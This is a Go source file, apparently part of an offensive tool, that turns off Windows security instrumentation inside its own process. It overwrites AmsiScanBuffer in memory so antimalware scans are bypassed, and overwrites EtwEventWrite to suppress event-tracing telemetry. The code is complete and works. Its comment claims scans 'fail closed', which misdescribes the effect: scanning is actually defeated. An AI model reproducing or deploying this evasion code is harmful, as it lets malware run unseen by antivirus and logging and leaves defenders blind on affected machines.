//go:build windows

package patch

import (
	"encoding/hex"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// AMSI replaces the prologue of amsi.dll!AmsiScanBuffer with
// "mov eax, 0x80070057; ret" (E_INVALIDARG), so scans fail closed.
func AMSI() (Result, error) {
	return apply("amsi", "amsi.dll", "AmsiScanBuffer",
		[]byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3})
}

// ETW replaces ntdll.dll!EtwEventWrite with "xor eax, eax; ret", suppressing
// Event Tracing for Windows emissions from this process.
func ETW() (Result, error) {
	return apply("etw", "ntdll.dll", "EtwEventWrite",
		[]byte{0x33, 0xC0, 0xC3})
}

func apply(name, module, symbol string, replacement []byte) (Result, error) {
	if err := validateName(name); err != nil {
		return Result{}, err
	}
	dll := windows.NewLazySystemDLL(module)
	if err := dll.Load(); err != nil {
		return Result{}, fmt.Errorf("loading %s: %w", module, err)
	}
	proc := dll.NewProc(symbol)
	addr := proc.Addr()
	if addr == 0 {
		return Result{}, fmt.Errorf("resolving %s!%s", module, symbol)
	}

	oldProtect := uint32(0)
	if err := windows.VirtualProtect(addr, uintptr(len(replacement)),
		windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
		return Result{}, fmt.Errorf("changing protection on %s!%s: %w", module, symbol, err)
	}
	defer func() {
		var ignored uint32
		_ = windows.VirtualProtect(addr, uintptr(len(replacement)), oldProtect, &ignored)
	}()

	// Unsafe.Add avoids a bare uintptr-to-Pointer conversion (go vet's
	// unsafeptr check); the address is the module's resolved export.
	base := unsafe.Add(unsafe.Pointer(nil), addr)
	target := unsafe.Slice((*byte)(base), len(replacement))
	original := make([]byte, len(replacement))
	copy(original, target)
	copy(target, replacement)

	return Result{
		Name:    name,
		Module:  module,
		Symbol:  symbol,
		Address: formatAddress(addr),
		Old:     hex.EncodeToString(original),
		New:     hex.EncodeToString(replacement),
	}, nil
}
